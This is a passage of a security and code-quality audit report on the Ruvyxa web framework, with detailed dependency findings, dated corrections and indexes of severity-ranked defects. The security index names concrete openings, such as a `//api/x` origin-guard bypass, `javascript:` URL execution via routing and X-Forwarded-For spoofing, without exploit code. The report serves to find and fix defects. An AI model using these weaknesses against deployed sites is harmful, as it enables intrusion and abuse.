**Correction (2026-08-30, from implementing this):** the recommended fix is not available. There is
no `24.19.x` line of `@types/node` to bump to — the newest 24.x ever published is `24.13.3`, which
is what this workspace already pins, verified against all 66 published 24.x versions.
DefinitelyTyped publishes `@types/node` when the _types_ change, not once per Node release, so
requiring minor parity would fail against every version that exists, and the entry's fallback of
"require `>=` on the minor" would too: the types minor is _behind_ the engine minor, which is the
normal state. The gap the entry describes is real and is a property of that release cadence rather
than a drift anyone can close by pinning. The major stays the contract, and the failure message now
carries both numbers and says why the minor is not compared.

**DEP-11 — `check-doc-links.mjs` sees only committed files, unlike its sibling which deliberately
does not.** _Reliability._ `git ls-files '*.md'` — while `check-source-path-refs.mjs` uses
`['ls-files', '--cached', '--others', '--exclude-standard', …]` and states why: "`ls-files` alone
lists only what is already committed, so a file added in the working tree — including the one that
introduces a stale pointer — would pass this check and fail for whoever ran it next." **Impact:** a
pre-commit or pre-push run of `release:validate` gives a false green on the file being added. CI is
unaffected because everything there is committed — so this only costs the person who runs the gate
locally, which is when it is most useful. **Fix:** use the same pathspec. **Risk:** untracked
Markdown inside directories `.gitignore` does not cover would newly be scanned; `--exclude-standard`
handles `dist/`, `node_modules/`, and the test-build directories. **Tests:** write an untracked
`.md` with a broken link into a temp clone and assert a non-zero exit.

**DEP-12 — `minimumReleaseAgeExclude` names versions the workspace no longer pins, and no
`minimumReleaseAge` is configured for it to modify.** _Dependency._ **Confidence: CONFIRMED
(staleness) / SPECULATIVE (failure mode).** All 23 excluded specifiers name
`oxc-transform@0.142.0 || 0.143.0` and `sass@1.103.0`, while the workspace pins `oxc-transform` at
`0.146.0` (held in lockstep with `Cargo.toml` by `check-oxc-lockstep.mjs`) and `sass` at `^1.103.1`.
There is no `minimumReleaseAge` key anywhere: not in `pnpm-workspace.yaml`, not in an `.npmrc` (the
repository has none), and not in the lockfile's recorded settings. **What would settle the
speculative half:** whether pnpm 11.23 does anything with `minimumReleaseAgeExclude` when no
`minimumReleaseAge` is set, and whether a machine- or organisation-level `.npmrc` supplies one — in
which case a cold `pnpm install --frozen-lockfile` would be _blocked_ on the current pins until they
age out, which is a CI break rather than a warning. **Impact:** today, dead configuration that reads
as a live policy — a maintainer bumping `oxc` will reasonably assume this list must move with it and
spend time on 23 lines that do nothing. **Fix:** either delete the block, or set `minimumReleaseAge`
explicitly and derive the exclusion list from the pinned `oxc-transform` version inside
`check-oxc-lockstep.mjs`, which already reads that version and already fails on drift. **Risk:** if
`minimumReleaseAge` is set outside the repository, deleting the block turns a silent install into a
blocked one — verify with `pnpm config get minimumReleaseAge` before removing. **Tests:** extend
`check-oxc-lockstep.mjs` to assert every `oxc-transform@…` entry names the pinned version, or that
the block is absent.

**Correction (2026-08-30, from implementing this):** the speculative half is settled, in the
direction that makes deletion safe. `pnpm config get minimumReleaseAge` answers `undefined`, there
is no repository `.npmrc`, the user-level one carries only an auth token, and `pnpm-lock.yaml`
records no such setting — so removing the block cannot turn a silent install into a blocked one, and
cannot break `--frozen-lockfile`. The 23 entries were deleted rather than rewritten: an exclusion
list under no policy is not a policy, and setting `minimumReleaseAge` would be introducing one. The
entry's own test suggestion is implemented in `check-oxc-lockstep.mjs`, which already reads the
pinned version, so the list cannot come back naming a version the workspace does not pin.

**DEP-13 — `check-cross-language-constants.mjs` evaluates a partial expression with `Function()` and
no `try`.** _Reliability._ `JS_CONST` captures the initializer with `(.*)$` — to end of line only —
so a constant whose arithmetic initializer wraps across lines yields a syntactically incomplete
`text` that still satisfies the `/^[\d\s*+()]+$/` guard, and `Function()` throws an uncaught
`SyntaxError`. The guard does correctly prevent injection (no identifier can reach `Function()`), so
this is a robustness hole and not a security one. **Impact:** `pnpm release:validate` fails with a
Node stack trace naming neither the constant nor the file. Low likelihood — the repository's current
arithmetic constants are all single-line. **Fix:** wrap the `Function()` call in
`try { … } catch { return null }`; returning `null` routes into the existing "no longer a scalar
this check can compare" failure, which is the correct, well-worded message for this case. **Risk:**
none; the fallback path already exists. **Tests:** assert `scalar('(50 *')` returns `null` rather
than throwing.

**DEP-14 — The two dependency-audit lanes disagree about scope, and neither gates a release.**
_Security._ `cargo audit --file Cargo.lock` covers everything in the lockfile, dev-dependencies
included; `pnpm audit --prod --audit-level low` excludes them — and the root `package.json` declares
_only_ devDependencies (`knip`, `oxlint`, `prettier`, `typescript`, `react*`, `@types/node`,
`postcss`), so the JavaScript lane audits none of the tooling that runs in CI. Both jobs are in a
workflow `release.yml` does not depend on, and whose triggers are path-filtered to manifest files.
**Impact:** a published advisory in the JavaScript toolchain that runs inside CI — including in the
release job that holds `NPM_TOKEN` — is not surfaced, and a tagged release can publish while an
advisory is outstanding. **Note on scope:** no advisory is asserted anywhere in this audit; neither
`cargo audit` nor `pnpm audit` was run. What _is_ verified from the lockfiles: no dependency
resolves from a git URL, a tarball URL, or any non-registry source, and `unsafe-libyaml 0.2.11` /
`winapi 0.3.9` are the only obviously-legacy transitive crates — both covered by the daily
`cargo audit` cron, so no finding is claimed against them. **Fix:** add a second `pnpm audit` step
without `--prod` at a higher `--audit-level`, and add the audit jobs to `verify-release`'s `needs`
or run them as steps inside it. **Risk:** a non-`--prod` audit at `low` will be noisy — pick `high`
for the second step. Gating the release on the audit means a newly published advisory can block a
release that was otherwise ready; that is the intent, but it needs an agreed override path.
**Tests:** extend `ci_workflows.rs` with an assertion that the release's verification job depends
on, or contains, both audit lanes.

**DEP-15 — `check-silent-defaults.mjs` covers only Rust, in a repository whose stated top rule is
that both halves move together.** _Maintainability._ `git ls-files 'crates/**/*.rs'` — while the
header states the invariant in language-neutral terms and both incidents it cites are Rust. The
JavaScript half has the identical class in different spellings (a `catch {}` around a `readFile`, `?? ''`
on a parse, `.catch(() => null)` on a dynamic import) with no equivalent gate; the nearest lint
rule, `eslint/preserve-caught-error`, is disabled in `.oxlintrc.json`. **Impact:** a gap rather than
a bug, so Low. It matters because `packages/ruvyxa/runtime/*.mjs` is where the deployed prerender
worker, the adapter runner, and the serverless handler live — the code furthest from a developer's
console, where an invented value is least likely to be noticed. **Fix:** add a second pass over `packages/**/*.{mjs,ts}`
with a JS-shaped `FABRICATE` pattern (an empty `catch {}` block, and `catch` clauses whose body only
returns a literal), reusing the same `ALLOWED`-with-reasons mechanism. **Risk:** a naive JS pattern
produces many false positives — a `catch` around an optional feature detection is legitimate. Keep
the check's own stated principle (err toward silence) and start with only the empty-`catch`-swallowing-a-read
shape. Expect a substantial first-run list; land it as its own change with the allowlist populated
deliberately. **Tests:** fixture snippets exercising each recognised and each deliberately-ignored
JS shape.
---

# Cross-cutting indexes

The same 141 findings, indexed by the axes the audit was commissioned against. No finding is
repeated in full; each row points at its entry above.

## Security findings

| Severity | ID         | What                                                                     |
| -------- | ---------- | ------------------------------------------------------------------------ |
| Critical | `RUV-C1`   | Request-scoped render served to a shared CDN as publicly cacheable       |
| Critical | `RUV-C2`   | `//api/x` bypasses `originGuard` and every path-scoped plugin hook       |
| Critical | `RUV-C5`   | `javascript:` URL from data executes via `router.push` / `route()`       |
| High     | `RUV-H1`   | Only the first `X-Forwarded-For` line is read                            |
| High     | `RUV-H2`   | Standalone server trusts `X-Forwarded-For` with no peer gate             |
| High     | `RUV-H3`   | Netlify and Firebase declare no `clientIpHeaders`                        |
| High     | `RUV-H4`   | Rate limiter refuses all new clients at capacity; key is attacker-chosen |
| High     | `RUV-H5`   | `POST /__ruvyxa/rsc` has no origin check, rate limit, or replay guard    |
| High     | `RUV-H6`   | Frozen platform config: pre-v1.1.1 projects serve no security headers    |
| High     | `RUV-H7`   | Magic-link sign-in 403s its own form (security-adjacent reliability)     |
| Medium   | `DEVR-01`  | Dev-only HMR WebSocket reachable in `ruvyxa start`                       |
| Medium   | `DEVR-05`  | `.env` silently overrides platform-injected secrets                      |
| Medium   | `CLIB-02`  | Build report with absolute paths served at a public URL                  |
| Medium   | `RTMS-04`  | i18n redirect builds an absolute `Location` from the client `Host`       |
| Medium   | `SEC-02`   | `magic-link` is an unauthenticated outbound-mail amplifier               |
| Medium   | `SEC-03`   | `healthCheck()` echoes the raw exception to an anonymous endpoint        |
| Medium   | `DEP-02`   | `format-staged.mjs` passes filenames through `cmd.exe` unescaped         |
| Low      | `ASSET-09` | The single named HTML escaper omits `'` (not exploitable today)          |
| Low      | `ASSET-10` | Predictable PostCSS scratch path in shared temp (SPECULATIVE)            |
| Low      | `ASSET-11` | Containment check degrades to a textual prefix test on error             |
| Low      | `GMDT-10`  | Absolute developer paths written into the uploaded SARIF report          |
| Low      | `GMDT-11`  | Filesystem paths reach the terminal unfiltered between ANSI escapes      |
| Low      | `RTMC-07`  | Package `exports` targets joined lexically, no symlink containment       |
| Low      | `SEC-08`   | `webVitals` collector unauthenticated and unthrottled                    |
| Low      | `SEC-09`   | OAuth `email` surfaced without `email_verified`                          |
| Low      | `SEC-11`   | `security.txt` contact skips the control-character check                 |
| Low      | `ADP-05`   | `adapter-static` emits headers only two of its named hosts can read      |
| Low      | `ADP-06`   | `create-ruvyxa` validates only the basename of the target path           |
| Low      | `DEP-14`   | Audit lanes disagree on scope and neither gates a release                |

**Verified closed** (checked deliberately, no finding raised): path traversal on every file-serving
path; `</script>` and `<!--<script>` breakout in embedded JSON; SQL injection (no SQL is
constructed); JWT algorithm confusion (no JWT exists); session-token entropy and constant-time
lookup; session fixation; OAuth state, PKCE, and redirect-URI validation; credentialed wildcard
CORS; SSRF through the Cloudflare image path; secrets inlined into emitted handlers or the deploy
manifest; and `function-alias` symlinks escaping the output directory.

## Reliability findings

| Severity | ID                                                | What                                                                  |
| -------- | ------------------------------------------------- | --------------------------------------------------------------------- |
| Critical | `RUV-C3`                                          | `export default` of a multi-line template injects `;` into the string |
| Critical | `RUV-C4`                                          | Interrupted build wipes `dist/` and strands the previous build        |
| High     | `RUV-H8`                                          | Minified ESM import silently erased                                   |
| High     | `RUV-H9`                                          | Multi-line `import Default, {` fails the build (RUV1612)              |
| High     | `RUV-H10`                                         | Regex-blind tokenizer breaks `.mdx` with a quote-bearing regex        |
| High     | `RUV-H11`                                         | Linker indents lines inside multi-line template literals              |
| High     | `RUV-H12`                                         | Warm cache returns an empty alias map, and persists it                |
| High     | `RUV-H13`                                         | `import.meta.env` unsubstituted in `.js`/`.mjs`/`.cjs` by Rust        |
| High     | `RUV-H14`                                         | Graph resolver substitutes extensions instead of appending            |
| High     | `RUV-H15`                                         | Deadline nesting kills the worker and its siblings                    |
| High     | `RUV-H16`                                         | Client disconnect never reaches the worker                            |
| High     | `RUV-H17`                                         | `image.maxWidth` refused by the config renderer                       |
| High     | `RUV-H18`                                         | Cross-language gate blind to the deployed runtime's copy              |
| Medium   | `BUNF-04` `BUNF-07` `BUNB-03` `BUNB-04` `BUNB-05` | resolution and cache-identity defects                                 |
| Medium   | `DEVR-02` `DEVR-04` `DEVR-06`                     | drain window, WebSocket buffering, dropped query                      |
| Medium   | `DEVC-03`                                         | No watcher debounce                                                   |
| Medium   | `ASSET-01` `ASSET-02` `ASSET-05`                  | `Content-Length`, wrong status page, silent dev fallback              |
| Medium   | `CLIB-03` `CLIB-05` `CLIB-06`                     | audit decode, orphaned workers, ungated third path rule               |
| Medium   | `CLIC-02` `CLIC-03` `CLIC-04`                     | frozen sitemap, unvalidated image knobs, broken-pipe panics           |
| Medium   | `GMDT-04` `GMDT-06` `GMDT-08`                     | directive check, `.jsx` layouts, short-circuit layer order            |
| Medium   | `RTMC-04` `RTMC-06`                               | env-name extraction, `node_modules` in the fingerprint                |
| Medium   | `RTMS-03` `RTMS-05` `RTMS-07`                     | dead invalidation, reserved-path divergence, tee leak                 |
| Medium   | `CORE-03` `CORE-04` `CORE-05` `CORE-06` `CORE-07` | image fallback, harness, body buffering, SSE, mock cache              |
| Medium   | `SEC-04` `SEC-05` `SEC-06` `SEC-07`               | PWA stamp, content re-walk, dropped writes, unbounded fetch           |
| Medium   | `ADP-03`                                          | Vercel ISR parent-route mismatch                                      |
| Medium   | `DEP-03` `DEP-04` `DEP-05`                        | release gate, orphaned smoke server, unrun reproducibility gate       |
| Low      | 40 further entries                                | see the Low section                                                   |

## Performance bottlenecks

| ID         | Cost                                                                                                                      | Scales with                |
| ---------- | ------------------------------------------------------------------------------------------------------------------------- | -------------------------- |
| `BUNF-05`  | A full byte scan of every module for a marker that is almost never present, plus a glob directory walk repeated per route | modules × routes           |
| `BUNF-06`  | O(n²) linear scan inside the client-closure BFS                                                                           | modules² × routes          |
| `DEVC-04`  | N concurrent requests for one cold URL cost N full renders                                                                | pool size, per cache miss  |
| `DEVC-05`  | A `canonicalize` syscall per watcher event on the single notify thread                                                    | filesystem event volume    |
| `ASSET-03` | A full lowercased copy of the document plus 8 scans, per SSR render                                                       | page size × requests       |
| `ASSET-04` | A 20 MiB read and hash on every on-demand image request, cache hits included                                              | source size × requests     |
| `ASSET-08` | O(prefix²) rescan for `</head>` while the head accumulates                                                                | chunk count                |
| `CLIB-04`  | Every cached prerender artifact read and parsed twice, on warm builds only                                                | pages                      |
| `CLIB-09`  | Two `canonicalize` syscalls per prerender input path                                                                      | paths × modules            |
| `CLIC-07`  | An unbounded store re-examined every build, 2 round-trips per entry                                                       | build count                |
| `SEC-05`   | A recursive directory walk and a `stat` per content page, per request                                                     | content pages × crawl rate |
| `RTMC-06`  | Every bundled dependency file hashed into the app fingerprint and watched                                                 | dependency size            |
| `BUNB-03`  | `artifact-graph.json` grows without bound and is parsed in full every build                                               | build count                |
| `BUNB-06`  | O(64 × n) fold loop that also stops early                                                                                 | module size                |

## Code smells worth acting on

Reported only where the smell plausibly causes defects, weakens security, or materially raises the
cost of the next change — with the specific reason, not the label.

| ID         | Smell                                                                   | Why it earns a place                                                                                                                                                                 |
| ---------- | ----------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `GMDT-07`  | God file — 4,776 lines, nine responsibilities                           | **Two findings in this report are directly attributable to it** (`RUV-H14`, `GMDT-04`): a reviewer cannot see that two functions 900 lines apart answer the same question two ways   |
| `BUNF-09`  | One rule written twice (`decorator_can_start` / `begins_decorator`)     | Widening either half alone makes the decorator survive and oxc blame a character; both failure modes name the wrong cause                                                            |
| `RTMS-08`  | Three helpers re-implemented beside the shared modules that export them | The payload parser decides how an action's input is decoded; a content-type fix in one copy silently splits `dev`/`start` from every deployed build                                  |
| `ASSET-12` | A weaker second copy of the serving rules                               | It is what `test:parity` exercises, so the command that proves host parity drives the copy that answers none of the caching or range questions — already diverged by five behaviours |
| `CLIC-11`  | A third hand-rolled byte scanner                                        | Fifth-plus instance of a pattern the repo has a written rule against; harmless today only because the consequence is an advisory                                                     |
| `GMDT-05`  | Three diagnostic codes with six meanings                                | The SARIF writer keeps only the first, so an uploaded report mislabels results; nothing can notice a fourth meaning being added                                                      |
| `BUNF-10`  | Per-occurrence diagnostic used as a per-name conclusion                 | Noise is loudest exactly when the reader most needs the _set_ of leaked names, and the duplication is cached                                                                         |
| `CLIC-08`  | Documentation describing behaviour that does not exist                  | The file positions itself as the contract for accepted spellings, so a reader debugging a rejection looks for a bug instead of adding the alias                                      |
| `DEP-06`   | Two hand-maintained lists beside a helper written to derive them        | A recurring release-time trap whose error message names neither the file nor the missing entry                                                                                       |
| `CORE-04`  | A test harness re-implementing the registration API                     | The documented way to test a plugin passes for plugins the framework will not boot                                                                                                   |

## Technical debt

Structural positions that will keep producing findings until they change.

1. **Three descriptions of the config surface** — `ProjectConfig` (Rust), `CONFIG_KEY_SCHEMA` (JS),
   `RuvyxaConfig` (TS) — with only the JS↔TS pair gated, and that gate driven by a hand-written
   literal so a key missing from _both_ sides is invisible. `RUV-H17` is the instance that shipped;
   the missing Rust↔JS generator is the debt.
2. **Three (not two) module resolvers.** The architecture says two; `ruvyxa_graph` has a private
   third (`RUV-H14`) and `content.rs` a private fourth tokenizer (`RUV-H10`).
3. **Four hand-written `createHandler` wrappers** across the serverless adapters. The duplication
   itself is tolerable; the _divergence_ it permits is not — `RUV-H3` is one wrapper differing from
   another in a way no fixture asks about.
4. **An endpoint conformance fixture that describes endpoints, not policy.** It cannot see `RUV-H5`,
   `DEVR-01`, `RTMS-05`, `DEVR-02`, or `DEVR-11`, all of which are policy divergences between hosts
   on endpoints the fixture already lists.
5. **Gates with holes.** `RUV-H18`, `CLIC-06`, `DEP-08`, `DEP-11`, `DEP-13`, `DEP-15`, and `CLIB-06`
   are all "a checker exists, passes, and structurally cannot observe the defect". Two tests —
   `SEC-03` and `SEC-04` — go further and _assert the defective behaviour_.
6. **Cancellation is absent from the worker protocol** (`RUV-H16`). Every streamed response, every
   client disconnect, and every timed-out render inherits this.
7. **`knip` cannot see unused exports in `packages/ruvyxa/runtime/*.mjs`**, because every runtime
   module is declared as an _entry_. Confirmed still open. `cargo clippy` likewise does not warn on
   unreachable `pub` items in a library crate — eight such items accumulated behind that blind spot
   in `ruvyxa_bundler` alone.

## Possibly dead code

**Nothing in this table is marked safe to delete.** Every item was checked against static
references, dynamic `import()`/`require()`, string-keyed and reflective lookup, registration tables,
dependency injection, plugin loading, config references (`package.json` `exports`/`files`/`bin`,
`Cargo.toml`, `knip.json`, adapter manifests), CLI entrypoints, `scripts/`, tests and fixtures, the
published public API, and generated code under `templates/`. Where a check could not be completed,
the row says so and the status stays `POSSIBLY UNUSED`.

| Item                                                          | Location                                   | Status                                  | Note                                                                                                                                                                                   |
| ------------------------------------------------------------- | ------------------------------------------ | --------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `minifier::tree_shake_exports`                                | `ruvyxa_bundler/src/minifier.rs:214`       | POSSIBLY UNUSED                         | No caller at all, not even a test                                                                                                                                                      |
| `ArtifactTaskGraph::invalidate`                               | `task_graph.rs:370`                        | POSSIBLY UNUSED                         | Tests only. **Do not remove** — it is the mechanism `BUNB-03`'s retention fix would reuse                                                                                              |
| `ArtifactTask::fail`                                          | `task_graph.rs:736`                        | POSSIBLY UNUSED                         | Only the internal call on the line below it                                                                                                                                            |
| `CompileCache::invalidate`                                    | `cache.rs:328`                             | POSSIBLY UNUSED                         | Own test only — and unsafe to start using as written: it keys on `JsxRuntime::Classic` while the compile path keys on the project's real runtime, so it would remove nothing, quietly  |
| `sourcemap::decode_mappings`                                  | `sourcemap.rs:460`                         | POSSIBLY UNUSED in production           | Keep — the only independent decoder the map tests have; should be `pub(crate)` or `#[cfg(test)]`, since it `.expect()`s on malformed input                                             |
| `SourceMapBuilder::add_identity_mappings`                     | `sourcemap.rs:148`                         | POSSIBLY UNUSED                         | Own test only                                                                                                                                                                          |
| `SourceMapBuilder::add_name`                                  | `sourcemap.rs:100`                         | POSSIBLY UNUSED                         | `encode_mappings` never emits the fifth VLQ field, so the `names` table is always empty in a real map                                                                                  |
| `linker::link_parallel`                                       | `linker.rs:412`                            | POSSIBLY UNUSED                         | Own test only; production goes through `link_with_origins`                                                                                                                             |
| `ResolveGraphCache::with_capacity`                            | `resolver.rs:205`                          | POSSIBLY UNUSED                         | `pub` on a `publish = false` crate, so no external consumer is possible                                                                                                                |
| `ResolveGraphCache::invalidate_paths`                         | `resolver.rs:475`                          | POSSIBLY UNUSED                         | Deliberately retained; its own doc explains the future caller                                                                                                                          |
| `content::compile_content_module_shared`                      | `content.rs:34`                            | POSSIBLY UNUSED as a public entry point | The `_in_root` form is what the resolver uses                                                                                                                                          |
| `content::resolve_mdx_components_file`                        | `content.rs:110`                           | POSSIBLY UNUSED                         | Production uses the `_in_root` form                                                                                                                                                    |
| `PresenceDescriptor` / `PluginRegistryDescriptor::presence()` | `ruvyxa_middleware/src/plugin_host.rs:143` | POSSIBLY UNUSED                         | Not in the crate's `pub use` list, unlike its sibling `RealtimeDescriptor`. **Not checked:** whether a first-party plugin claiming `presence@1` expects the native server to act on it |
| `RateLimitLayer`'s bare `Layer` impl                          | `builtin.rs:559`                           | POSSIBLY UNUSED (public API — keep)     | `MiddlewareStack` always installs the keyed variant; this one hard-codes `key_by: "ip"`                                                                                                |
| `ruvyxa_graph::RouteParams`                                   | `ruvyxa_graph/src/lib.rs:14`               | POSSIBLY UNUSED — check not completed   | The other crates and `packages/` were not grepped for it                                                                                                                               |
| `DiscoveryReport::sitemap_files_written`                      | `site_discovery.rs:318`                    | POSSIBLY UNUSED                         | Assigned twice, read nowhere; every check applies and all were completed                                                                                                               |
| `RenderCache::invalidate_route` (async)                       | `render_cache.rs:701`                      | POSSIBLY UNUSED                         | The watcher uses the blocking twin                                                                                                                                                     |
| `AdapterOutput.configFiles`                                   | `@ruvyxa/core/src/types.ts:917`            | POSSIBLY UNUSED                         | Declared by 7 of 11 adapters, read by nothing in this repo. **Cannot be proven** unreferenced outside it — a published public type                                                     |
| `adapter-vercel`'s `configFiles: ['vercel.json']`             | `adapter-vercel/src/index.ts:827`          | **Incorrect value, not dead**           | The adapter emits no `vercel.json`; its platform config is `.vercel/output/config.json`                                                                                                |
| `publish:dry-run` script                                      | `package.json:29`                          | POSSIBLY UNUSED                         | Superseded in practice by `pack:smoke` and the real publish loop. **Not checked:** whether a maintainer runs it by hand                                                                |
| `minimumReleaseAgeExclude` block                              | `pnpm-workspace.yaml:26-49`                | POSSIBLY UNUSED                         | See `DEP-12`; **not checked:** whether an out-of-repo `.npmrc` sets `minimumReleaseAge`                                                                                                |
| `.prettierignore` entry `.test-build/`                        | `.prettierignore:17`                       | POSSIBLY REDUNDANT                      | The real residue directories are `.test-build-*`, excluded instead by `.gitignore`                                                                                                     |

Two items that _look_ dead and are not, recorded so they are not removed: `bundleInputDirectories`
in `worker-pool.mjs` is dead only because of the missing import in `RTMS-03` — fixing the import
makes it live; and `WORKER_REQUEST_TIMEOUT_MS`'s watchdog and the worker's 5-second shutdown
fallback are both _unreachable, not unreferenced_ (`RUV-H15`, `DEVC-06`), and fixing those findings
makes them live.

`templates/plugin/` also looks orphaned on a first read — it is absent from `STARTER_TEMPLATES` —
but it is `include_str!`'d by `cli_args.rs`, asserted by a Rust test, and referenced by two scripts.
It is live and gated by `cargo build`.

## Dependency risks

**No CVE is asserted in this report.** Neither `cargo audit` nor `pnpm audit` was run, to keep the
tree untouched. The rows below are what the lockfiles and manifests state.

| Risk                                   | ID       | Detail                                                                                                                                              |
| -------------------------------------- | -------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| Types drifted behind the runtime floor | `DEP-10` | `@types/node` 24.13.3 against `engines.node >= 24.19.0`; the gate compares only the major                                                           |
| Stale pin-exclusion policy             | `DEP-12` | 23 `minimumReleaseAgeExclude` entries naming superseded versions, with no `minimumReleaseAge` anywhere in the repo to modify                        |
| Audit coverage asymmetry               | `DEP-14` | `cargo audit` covers dev-dependencies; `pnpm audit --prod` excludes them — and the root manifest is _only_ devDependencies. Neither gates a release |

**Verified clean:** no `postinstall`, `preinstall`, or `install` script in any workspace manifest;
no git-URL, tarball, or non-registry resolution anywhere in `pnpm-lock.yaml`; `allowBuilds`
explicitly denies `@parcel/watcher`'s build script with a written reason; `setup.sh` and `setup.bat`
download and execute nothing. Every dependency of `packages/ruvyxa` is reached from real code, and
every entry in `[workspace.dependencies]` is referenced by at least one crate manifest. The `oxc`
lockstep holds (`=0.146.0` on both sides, gated); `packageManager` matches what the tests assert, so
the known "pnpm install silently rewrites it" hazard has not fired on this tree; and `engines.node`
is identical across all 20 published manifests and all five templates.

## Corrections to the audit's own starting premises

Two long-standing assumptions were checked and are **no longer accurate**. Reporting them as open
gaps would have been wrong:

1. **"`templates/` is not compiled by anything" — largely closed.** `pnpm pack:smoke`, a CI step on
   all five platforms, packs `create-ruvyxa`, scaffolds all four starters, and runs `typecheck` in
   each; `templates/plugin` is `include_str!`-embedded and smoke-tested; `pnpm lint` runs oxlint
   over `templates`. **Residual gap:** only the minimal starter gets `ruvyxa check` — blog, crud,
   and api get `tsc` but never route-graph validation.
2. **"A backtick in a comment in a generated-source template breaks emitted JS with nothing catching
   it" — substantially closed.** Seven tests now compile generated output with `new Function`.
   **Residual gap:** only 1 of the 23 exported templates in `entry-templates.mjs` has its output
   compiled by a test; the auditing agent emitted and `node --check`-parsed all 23 with Windows
   paths and every one parses, so turning that probe into a test is the cheap way to keep it true.

A third was confirmed **still open**: `knip` is blind to unused exports in
`packages/ruvyxa/runtime/*.mjs`, because `knip.json` declares every runtime module as an entry.
